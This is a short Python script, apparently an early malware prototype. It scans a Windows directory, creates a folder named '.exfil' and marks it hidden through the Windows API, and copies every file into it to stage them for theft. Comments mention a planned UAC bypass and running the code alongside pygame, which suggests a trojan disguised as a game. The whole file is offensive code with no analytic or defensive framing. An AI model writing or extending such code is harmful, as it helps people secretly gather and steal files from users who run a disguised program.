import shutil
import os
import asyncio
import ctypes



def iterate_files():

    # test dir
    directory = "C:/Users/jgwfl/OneDrive/Desktop/test_dir"

    #file paths
    files = []

    #scan dir for object
    for obj in os.scandir(directory):
        #check if obj is file
        if obj.is_file():
            #append obj filepath to files
            files.append((obj.path).replace("\\", "/"))

    exfil_dir = create_hidden_dir(directory)
    if exfil_dir:
        copy_files(exfil_dir, files)
    
    

def create_hidden_dir(directory):

    #join exfil folder to path
    exfil = os.path.join(directory, ".exfil")

    try:
        #make exfil folder
        os.mkdir(exfil)
        #if os is windows
        if os.name == "nt":
            #set file property to hidden
            ctypes.windll.kernel32.SetFileAttributesW(ctypes.c_wchar_p(exfil), 0x02)
        return exfil
    except FileExistsError:
        print("File exists...Continuing")
        return exfil
    except PermissionError:
        print("Permissions Denied:")
        #implement UAC bypassing?
    except Exception as e:
        print(f"Error, {e}")
    
def copy_files(exfil, files):
    
    for file in files:
        fname = os.path.basename(file)
        dest = os.path.join(exfil, fname)

        try:
            shutil.copyfile(file, dest)
            print(f"[+] Copied {file} --> {dest}")
        except shutil.SameFileError:
            print("File exists...continuing")
            continue

#add async when pygame is run after
iterate_files()